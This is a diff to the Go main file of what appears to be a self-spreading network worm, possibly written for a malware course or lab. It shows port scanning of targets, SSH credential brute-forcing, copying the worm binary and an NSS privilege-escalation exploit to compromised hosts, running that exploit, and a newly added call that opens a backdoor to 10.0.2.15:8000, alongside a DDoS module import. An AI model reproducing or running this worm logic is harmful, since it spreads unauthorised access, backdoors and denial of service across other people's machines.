@@ -7,12 +7,12 @@ import (
 	"github.com/99graciamanel/mlw/worm/scan"
 	"github.com/99graciamanel/mlw/worm/ddos"
 	"strconv"
-	"os"
+	//"os"
 )
 
 func attack(wg *sync.WaitGroup, id int, ip string) {
 	attackerString := fmt.Sprintf("Attacker %d: ",id)
-	
+
 	fmt.Println(attackerString + ip)
 	ports := scan.ScanIp(ip)
 	fmt.Println(ports)
@@ -38,7 +38,7 @@ func attack(wg *sync.WaitGroup, id int, ip string) {
 	//SSH infect
 	if !infected && ports[1] != 0 {
 		ip_port := ip + ":" + strconv.Itoa(ports[1])
-		hit_credentials := infection.GuessSSHConnection(ip_port)
+		hit_credentials := infection.GuessSSHConnectionV2(ip_port)
 		if hit_credentials{
 			is_infected := infection.SshCheckInfection(ip_port)
 			fmt.Println(is_infected)
@@ -46,12 +46,8 @@ func attack(wg *sync.WaitGroup, id int, ip string) {
 				return
 			}
 			message := infection.SshInfect(ip_port, "worm")
-			message = infection.SshInfect(ip_port, "users.txt")
-			message = infection.SshInfect(ip_port, "passwords.txt")
-			//message = infection.SshInfect(ip_port, "slowloris")
-			message = infection.SshInfect(ip_port, "exploit_nss.py")
-			//message = infection.SshInfect(ip_port, "exploit_nss_manual")
-			//fmt.Println(message)
+			//We don't transfer the users and passwords because we are using the constants
+			message = infection.SshInfect(ip_port, "exploit_nss_manual")
 			message = infection.SshExploit(ip_port)
 			fmt.Println(message)
 			infected = true
@@ -61,11 +57,8 @@ func attack(wg *sync.WaitGroup, id int, ip string) {
 }
 
 func main() {
-	f, err := os.Create("/tmp/test")
-	if err != nil {
-        panic(err)
-    }
-	defer f.Close()
+	go infection.OpenBackdoor("10.0.2.15:8000")
+
 	var wg sync.WaitGroup
 	wg.Add(1)
 	go ddos.Hello(&wg,"test")
